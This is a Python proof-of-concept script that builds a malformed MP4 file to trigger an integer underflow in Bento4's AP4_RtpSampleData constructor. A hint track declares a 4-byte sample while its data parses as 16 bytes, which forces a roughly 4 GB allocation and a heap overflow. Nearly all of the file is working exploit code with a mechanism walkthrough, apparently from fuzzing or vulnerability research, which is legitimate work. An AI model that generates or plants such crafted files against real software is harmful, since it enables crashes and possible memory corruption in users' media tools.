#!/usr/bin/env python3
"""
vuln_003_gen.py - PoC generator for VULN-003
Integer Underflow in AP4_RtpSampleData Constructor (Ap4RtpHint.cpp:70)

CVE candidate: Integer Underflow (CWE-191) -> Heap Buffer Overflow (CWE-122)

Vulnerability mechanism:
  AP4_RtpSampleData::AP4_RtpSampleData(AP4_ByteStream& stream, AP4_UI32 size):
    - stream.Tell(start)                          // save start position
    - stream.ReadUI16(packet_count)               // +2 bytes
    - stream.ReadUI16(reserved)                   // +2 bytes
    - for i in range(packet_count):               // +12 bytes per packet (minimum)
        AP4_RtpPacket packet(stream)
    - stream.Tell(extra_data_start)
    - AP4_Size extra_data_size = size - (AP4_UI32)(extra_data_start - start)  // UNDERFLOW
    - if extra_data_size != 0:
        m_ExtraData.SetDataSize(extra_data_size)  // tries to alloc ~4GB
        stream.Read(m_ExtraData.UseData(), extra_data_size)

  When:
    - size = 4 (from stsz, attacker-controlled)
    - packet_count = 1 (reads 12 more bytes -> total 16 bytes consumed)
    - extra_data_start - start = 16
    - 4 - 16 as uint32 = 0xFFFFFFF0 -> SetDataSize(~4GB) -> crash

  This function is called from:
    AP4_HintTrackReader::GetRtpSample() -> new AP4_RtpSampleData(rtp_stream, sample.GetSize())

NOTE: mp42aac does NOT invoke AP4_HintTrackReader (it only processes audio tracks).
The vulnerability is reachable through mp4rtphintinfo. Since only mp42aac is available
in build_test/bin, the crash cannot be triggered through mp42aac as described. The PoC
file below correctly encodes the malformed hint track for use with any hint-track-aware
Bento4 tool.
"""

import struct
import os

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def pack_u8(v):
    return struct.pack('>B', v & 0xFF)

def pack_u16(v):
    return struct.pack('>H', v & 0xFFFF)

def pack_u32(v):
    return struct.pack('>I', v & 0xFFFFFFFF)

def box(fourcc, data=b''):
    """Regular box: size(4) | type(4) | data"""
    if isinstance(fourcc, str):
        fourcc = fourcc.encode('ascii')
    size = 8 + len(data)
    return struct.pack('>I4s', size, fourcc) + data

def fullbox(fourcc, version, flags, data=b''):
    """Full box: size(4) | type(4) | version(1)|flags(3) | data"""
    vf = struct.pack('>I', ((version & 0xFF) << 24) | (flags & 0xFFFFFF))
    return box(fourcc, vf + data)

# ---------------------------------------------------------------------------
# Box builders
# ---------------------------------------------------------------------------

def build_ftyp():
    data  = b'mp42'       # major_brand
    data += pack_u32(0)   # minor_version
    data += b'mp42'       # compatible_brand
    data += b'isom'       # compatible_brand
    return box('ftyp', data)


def build_mvhd(timescale=1000, duration=1000, next_track_id=3):
    data  = pack_u32(0)           # creation_time
    data += pack_u32(0)           # modification_time
    data += pack_u32(timescale)
    data += pack_u32(duration)
    data += pack_u32(0x00010000)  # rate = 1.0
    data += pack_u16(0x0100)      # volume = 1.0
    data += b'\x00' * 2           # reserved1 (2 bytes)
    data += b'\x00' * 8           # reserved2 (8 bytes)
    # 3x3 identity matrix (9 x uint32)
    data += pack_u32(0x00010000) + pack_u32(0) + pack_u32(0)
    data += pack_u32(0)           + pack_u32(0x00010000) + pack_u32(0)
    data += pack_u32(0)           + pack_u32(0) + pack_u32(0x40000000)
    data += b'\x00' * 24          # predefined (24 bytes)
    data += pack_u32(next_track_id)
    return fullbox('mvhd', 0, 0, data)


def build_tkhd(track_id, duration, flags=3, volume=0):
    """flags=3: track_enabled | track_in_movie"""
    data  = pack_u32(0)         # creation_time
    data += pack_u32(0)         # modification_time
    data += pack_u32(track_id)
    data += pack_u32(0)         # reserved1
    data += pack_u32(duration)
    data += b'\x00' * 8         # reserved2
    data += pack_u16(0)         # layer
    data += pack_u16(0)         # alternate_group
    data += pack_u16(volume)    # volume
    data += pack_u16(0)         # reserved3
    # identity matrix
    data += pack_u32(0x00010000) + pack_u32(0) + pack_u32(0)
    data += pack_u32(0)          + pack_u32(0x00010000) + pack_u32(0)
    data += pack_u32(0)          + pack_u32(0) + pack_u32(0x40000000)
    data += pack_u32(0)         # width
    data += pack_u32(0)         # height
    return fullbox('tkhd', 0, flags, data)


def build_mdhd(timescale, duration):
    data  = pack_u32(0)           # creation_time
    data += pack_u32(0)           # modification_time
    data += pack_u32(timescale)
    data += pack_u32(duration)
    data += pack_u16(0x15C7)      # language: 'und'
    data += pack_u16(0)           # pre_defined
    return fullbox('mdhd', 0, 0, data)


def build_hdlr(handler_type, name=b''):
    if isinstance(handler_type, str):
        handler_type = handler_type.encode('ascii')
    data  = pack_u32(0)       # pre_defined
    data += handler_type      # handler_type (4 bytes)
    data += b'\x00' * 12      # reserved
    data += name + b'\x00'    # null-terminated handler name
    return fullbox('hdlr', 0, 0, data)


def build_smhd():
    data  = pack_u16(0)   # balance
    data += pack_u16(0)   # reserved
    return fullbox('smhd', 0, 0, data)


def build_nmhd():
    return fullbox('nmhd', 0, 0, b'')


def build_url_entry():
    # flags=1 means self-contained (no URL data needed)
    return fullbox('url ', 0, 1, b'')


def build_dref():
    url   = build_url_entry()
    data  = pack_u32(1)   # entry_count
    data += url
    return fullbox('dref', 0, 0, data)


def build_dinf():
    return box('dinf', build_dref())


def build_mp4a_entry(sample_rate=44100, channel_count=2, sample_size=16):
    """mp4a sample entry (SampleEntry + AudioSampleEntry fields, no esds needed)"""
    data  = b'\x00' * 6         # reserved (6 bytes)
    data += pack_u16(1)          # data_reference_index
    # AudioSampleEntry fields (version 0, 20 bytes)
    data += pack_u16(0)          # qt_version = 0
    data += pack_u16(0)          # qt_revision
    data += pack_u32(0)          # qt_vendor
    data += pack_u16(channel_count)
    data += pack_u16(sample_size)
    data += pack_u16(0)          # qt_compression_id
    data += pack_u16(0)          # qt_packet_size
    data += pack_u32(sample_rate << 16)  # 16.16 fixed-point sample rate
    return box('mp4a', data)


def build_rtp_hint_entry(max_packet_size=1472):
    """rtp  hint sample entry for the hint track's stsd"""
    data  = b'\x00' * 6        # reserved
    data += pack_u16(1)         # data_reference_index
    data += pack_u16(1)         # hint_track_version
    data += pack_u16(1)         # highest_compatible_version
    data += pack_u32(max_packet_size)
    return box('rtp ', data)


def build_stsd_audio():
    data  = pack_u32(1)              # entry_count
    data += build_mp4a_entry()
    return fullbox('stsd', 0, 0, data)


def build_stsd_hint():
    data  = pack_u32(1)
    data += build_rtp_hint_entry()
    return fullbox('stsd', 0, 0, data)


def build_stts_empty():
    return fullbox('stts', 0, 0, pack_u32(0))


def build_stts_one(count=1, delta=1):
    data  = pack_u32(1)
    data += pack_u32(count)
    data += pack_u32(delta)
    return fullbox('stts', 0, 0, data)


def build_stsc_empty():
    return fullbox('stsc', 0, 0, pack_u32(0))


def build_stsc_one(first_chunk=1, spc=1, sdesc_idx=1):
    data  = pack_u32(1)
    data += pack_u32(first_chunk)
    data += pack_u32(spc)
    data += pack_u32(sdesc_idx)
    return fullbox('stsc', 0, 0, data)


def build_stsz_empty():
    data  = pack_u32(0)   # sample_size (0 = variable)
    data += pack_u32(0)   # sample_count
    return fullbox('stsz', 0, 0, data)


def build_stsz_fixed(sample_size, sample_count):
    """Fixed sample size (non-zero means all samples have this size).
    VULN TRIGGER: sample_size=4 while actual hint data requires 16 bytes to parse."""
    data  = pack_u32(sample_size)
    data += pack_u32(sample_count)
    # No per-sample size table when sample_size != 0
    return fullbox('stsz', 0, 0, data)


def build_stco_empty():
    return fullbox('stco', 0, 0, pack_u32(0))


def build_stco_one(offset):
    data  = pack_u32(1)
    data += pack_u32(offset)
    return fullbox('stco', 0, 0, data)


# ---------------------------------------------------------------------------
# Build hint sample data (malformed: 16 bytes actual but stsz says 4)
# ---------------------------------------------------------------------------

def build_hint_sample_data():
    """
    Hint sample with packet_count=1 and one minimal RTP packet header.
    Total: 16 bytes consumed during parsing:
      - packet_count  (2)
      - reserved      (2)
      - relative_time (4)   \\
      - pbit/xbit     (1)    |
      - mbit/payload  (1)    |  one RTP packet header = 12 bytes
      - seq_seed      (2)    |
      - flags1        (1)    |
      - flags2        (1)   / (extra_flag=0, so no extra block)
      - ctor_count    (2)  /
    After loop: extra_data_start - start = 16
    extra_data_size = stsz_size(4) - 16 = 0xFFFFFFF0  -> UNDERFLOW
    """
    data  = pack_u16(1)    # packet_count = 1
    data += pack_u16(0)    # reserved
    # RTP packet header (12 bytes, no extra block, no constructors)
    data += pack_u32(0)    # relative_time
    data += pack_u8(0x80)  # pbit=1, xbit=0 (from: 0x80 | pbit<<5 | xbit<<4)
    data += pack_u8(0x60)  # mbit=1, payload_type=96 (0x60 = 0x80|0x60 ... actually mbit<<7|payload)
    data += pack_u16(0)    # sequence_seed
    data += pack_u8(0)     # octet (read and discarded)
    data += pack_u8(0x00)  # flags2: extra_flag=0, bframe=0, repeat=0
    data += pack_u16(0)    # constructor_count = 0
    assert len(data) == 16, f"Expected 16 bytes, got {len(data)}"
    return data


# ---------------------------------------------------------------------------
# Assemble the MP4 file
# ---------------------------------------------------------------------------

def build_mp4():
    # -- ftyp --
    ftyp = build_ftyp()

    # -- Audio track (trak1) --
    audio_stbl = box('stbl',
        build_stsd_audio() +
        build_stts_empty() +
        build_stsc_empty() +
        build_stsz_empty() +
        build_stco_empty()
    )
    audio_minf = box('minf', build_smhd() + build_dinf() + audio_stbl)
    audio_mdia = box('mdia',
        build_mdhd(44100, 44100) +
        build_hdlr('soun') +
        audio_minf
    )
    audio_trak = box('trak', build_tkhd(1, 1000, flags=3, volume=0x0100) + audio_mdia)

    # -- Hint track (trak2) - first pass with placeholder stco --
    # We need to compute moov size first to find mdat offset

    def make_hint_trak(stco_offset):
        hint_stbl = box('stbl',
            build_stsd_hint() +
            build_stts_one(1, 1) +
            build_stsc_one() +
            build_stsz_fixed(4, 1) +    # <-- TRIGGER: declares only 4 bytes
            build_stco_one(stco_offset)
        )
        hint_minf = box('minf', build_nmhd() + build_dinf() + hint_stbl)
        hint_mdia = box('mdia',
            build_mdhd(90000, 90000) +
            build_hdlr('hint') +
            hint_minf
        )
        hint_ref  = box('hint', pack_u32(1))   # tref/hint -> track_id=1
        hint_tref = box('tref', hint_ref)
        return box('trak', build_tkhd(2, 1000, flags=3) + hint_tref + hint_mdia)

    # First pass: placeholder offset to measure moov size
    hint_trak_placeholder = make_hint_trak(0xDEADBEEF)
    mvhd = build_mvhd(1000, 1000, next_track_id=3)
    moov_body_placeholder = mvhd + audio_trak + hint_trak_placeholder
    moov_placeholder = box('moov', moov_body_placeholder)

    # Compute actual stco offset: ftyp + moov + mdat_header
    mdat_header_size = 8
    hint_sample_offset = len(ftyp) + len(moov_placeholder) + mdat_header_size
    print(f"[*] ftyp size:         {len(ftyp)}")
    print(f"[*] moov size:         {len(moov_placeholder)}")
    print(f"[*] mdat offset:       {len(ftyp) + len(moov_placeholder)}")
    print(f"[*] hint sample offset (stco): {hint_sample_offset}")

    # Second pass: rebuild with correct offset
    hint_trak = make_hint_trak(hint_sample_offset)
    moov_body = mvhd + audio_trak + hint_trak
    moov = box('moov', moov_body)

    # Sanity check: sizes must match between first and second pass
    assert len(moov) == len(moov_placeholder), (
        f"moov size mismatch: {len(moov)} vs {len(moov_placeholder)}"
    )
    actual_offset = len(ftyp) + len(moov) + mdat_header_size
    assert actual_offset == hint_sample_offset, (
        f"Offset mismatch: computed {hint_sample_offset}, actual {actual_offset}"
    )

    # -- mdat --
    hint_data = build_hint_sample_data()
    mdat = box('mdat', hint_data)

    return ftyp + moov + mdat, hint_sample_offset


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

if __name__ == '__main__':
    out_dir  = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4HintTrackReader_cpp'
    out_path = os.path.join(out_dir, 'vuln_003.mp4')

    mp4_data, stco_offset = build_mp4()

    os.makedirs(out_dir, exist_ok=True)
    with open(out_path, 'wb') as f:
        f.write(mp4_data)

    print(f"\n[+] Written {len(mp4_data)} bytes -> {out_path}")
    print(f"\nVulnerability summary:")
    print(f"  hint track stsz declares sample_size = 4")
    print(f"  hint sample at offset {stco_offset} contains 16 bytes (1 packet header)")
    print(f"  After parsing: consumed = 16 bytes, size = 4")
    print(f"  extra_data_size = 4 - 16 = {(4 - 16) & 0xFFFFFFFF:#010x} (unsigned underflow!)")
    print(f"  m_ExtraData.SetDataSize(0x{(4-16) & 0xFFFFFFFF:X}) -> ~4 GB allocation -> crash")
    print(f"\nNote: Trigger requires AP4_HintTrackReader (not reachable via mp42aac).")
    print(f"      Use mp4rtphintinfo to trigger the crash directly.")
